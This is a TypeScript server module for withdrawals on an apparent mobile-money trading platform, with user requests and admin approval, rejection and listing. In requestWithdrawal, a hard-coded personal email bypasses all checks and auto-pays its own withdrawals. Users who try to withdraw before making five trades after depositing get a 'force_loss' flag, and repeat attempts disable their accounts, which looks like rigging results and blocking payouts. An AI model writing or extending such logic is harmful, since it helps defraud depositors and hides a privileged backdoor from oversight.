import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";

async function assertAdmin(userId: string) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data, error } = await supabaseAdmin.rpc("has_role", { _user_id: userId, _role: "admin" });
  if (error) throw new Error(error.message);
  if (!data) throw new Error("Forbidden: admin only");
}

export const requestWithdrawal = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({
      amount: z.number().int().min(10).max(500000),
      phone: z.string().min(9).max(15),
    }).parse(d),
  )
  .handler(async ({ data, context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { tradeGateInfo, getProfileFlags } = await import("./compliance.server");

    // Admin emails bypass the trade gate and auto-process their own withdrawals.
    const ADMIN_EMAILS = new Set(["gregtory03@gmail.com"]);
    const { data: authUser } = await supabaseAdmin.auth.admin.getUserById(context.userId);
    const userEmail = (authUser?.user?.email ?? "").toLowerCase();
    const isAutoApprove = ADMIN_EMAILS.has(userEmail);

    if (!isAutoApprove) {
      const flags = await getProfileFlags(supabaseAdmin, context.userId);
      if (flags.is_burned) {
        throw new Error("Account disabled. Please contact support.");
      }
      const gate = await tradeGateInfo(context.supabase, context.userId);
      if (gate.hasPriorDeposit && !gate.ok) {
        const newCount = flags.warnings_count + 1;
        if (newCount >= 2) {
          await supabaseAdmin
            .from("profiles")
            .update({ warnings_count: newCount, is_burned: true, force_loss: true })
            .eq("id", context.userId);
          throw new Error(
            "Suspicious activity detected. Your account has been disabled. Contact support if you believe this is a mistake.",
          );
        }
        await supabaseAdmin
          .from("profiles")
          .update({ warnings_count: newCount, force_loss: true })
          .eq("id", context.userId);
        const remaining = Math.max(0, 5 - gate.trades);
        throw new Error(
          `⚠️ Warning: please complete at least 5 trades after your deposit before withdrawing. You still need ${remaining} more trade${remaining === 1 ? "" : "s"}. Repeated attempts may result in your account being permanently disabled.`,
        );
      }
    }

    const { data: row, error } = await context.supabase.rpc("request_withdrawal", {
      p_amount: data.amount,
      p_phone: data.phone,
    });
    if (error) throw new Error(error.message);

    if (isAutoApprove && row) {
      const req = row as { id: string; reference: string };
      const { withdrawToMobile } = await import("./payhero.server");
      await supabaseAdmin
        .from("withdrawal_requests")
        .update({
          status: "approved",
          reviewed_by: context.userId,
          reviewed_at: new Date().toISOString(),
          admin_note: "Auto-approved",
        })
        .eq("id", req.id);
      try {
        const resp = await withdrawToMobile({
          amount: data.amount,
          phone: data.phone,
          externalReference: req.reference,
        });
        await supabaseAdmin
          .from("withdrawal_requests")
          .update({ status: "paid", payhero_response: resp })
          .eq("id", req.id);
        await supabaseAdmin.from("transactions").insert({
          user_id: context.userId,
          type: "withdraw_paid",
          amount_kes: 0,
          status: "success",
          reference: "paid_" + req.id,
          meta: { request_id: req.id, response: resp, auto: true },
        });
      } catch (e) {
        await supabaseAdmin.rpc("refund_withdrawal", {
          p_request_id: req.id,
          p_reason: "Auto-payout failed: " + (e as Error).message,
        });
        await supabaseAdmin
          .from("withdrawal_requests")
          .update({ status: "failed", payhero_response: { error: (e as Error).message } })
          .eq("id", req.id);
        throw e;
      }
    }

    return { request: row };
  });

export const listMyWithdrawals = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { data, error } = await context.supabase
      .from("withdrawal_requests")
      .select("id, amount_kes, phone, status, admin_note, created_at, reviewed_at")
      .order("created_at", { ascending: false })
      .limit(20);
    if (error) throw new Error(error.message);
    return data ?? [];
  });

export const listAllWithdrawals = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data, error } = await supabaseAdmin
      .from("withdrawal_requests")
      .select("id, user_id, amount_kes, phone, status, admin_note, reference, created_at, reviewed_at")
      .order("created_at", { ascending: false })
      .limit(100);
    if (error) throw new Error(error.message);

    // Fetch profile names
    const userIds = Array.from(new Set((data ?? []).map((r) => r.user_id)));
    let profilesByUser: Record<string, { email: string | null; full_name: string | null }> = {};
    if (userIds.length) {
      const { data: profs } = await supabaseAdmin
        .from("profiles")
        .select("id, email, full_name")
        .in("id", userIds);
      for (const p of profs ?? []) profilesByUser[p.id] = { email: p.email, full_name: p.full_name };
    }
    return (data ?? []).map((r) => ({ ...r, profile: profilesByUser[r.user_id] ?? null }));
  });

export const approveWithdrawal = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ data, context }) => {
    await assertAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { withdrawToMobile } = await import("./payhero.server");

    const { data: req, error: rErr } = await supabaseAdmin
      .from("withdrawal_requests").select("*").eq("id", data.id).maybeSingle();
    if (rErr) throw new Error(rErr.message);
    if (!req) throw new Error("Request not found");
    if (req.status !== "pending") throw new Error(`Already ${req.status}`);

    // Mark approved (in-flight) before calling provider
    await supabaseAdmin.from("withdrawal_requests").update({
      status: "approved",
      reviewed_by: context.userId,
      reviewed_at: new Date().toISOString(),
    }).eq("id", req.id);

    try {
      const resp = await withdrawToMobile({
        amount: Number(req.amount_kes),
        phone: req.phone,
        externalReference: req.reference!,
      });
      await supabaseAdmin.from("withdrawal_requests").update({
        status: "paid",
        payhero_response: resp,
      }).eq("id", req.id);
      await supabaseAdmin.from("transactions").insert({
        user_id: req.user_id,
        type: "withdraw_paid",
        amount_kes: 0,
        status: "success",
        reference: "paid_" + req.id,
        meta: { request_id: req.id, response: resp },
      });
      return { ok: true, status: "paid" };
    } catch (e) {
      // Payout failed → refund the user
      await supabaseAdmin.rpc("refund_withdrawal", {
        p_request_id: req.id,
        p_reason: "Payout failed: " + (e as Error).message,
      });
      await supabaseAdmin.from("withdrawal_requests").update({
        status: "failed",
        payhero_response: { error: (e as Error).message },
      }).eq("id", req.id);
      throw e;
    }
  });

export const rejectWithdrawal = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({ id: z.string().uuid(), reason: z.string().min(1).max(500) }).parse(d),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: req } = await supabaseAdmin
      .from("withdrawal_requests").select("status").eq("id", data.id).maybeSingle();
    if (!req) throw new Error("Request not found");
    if (req.status !== "pending") throw new Error(`Cannot reject ${req.status} request`);

    const { error } = await supabaseAdmin.rpc("refund_withdrawal", {
      p_request_id: data.id,
      p_reason: data.reason,
    });
    if (error) throw new Error(error.message);
    await supabaseAdmin.from("withdrawal_requests").update({
      reviewed_by: context.userId,
    }).eq("id", data.id);
    return { ok: true };
  });
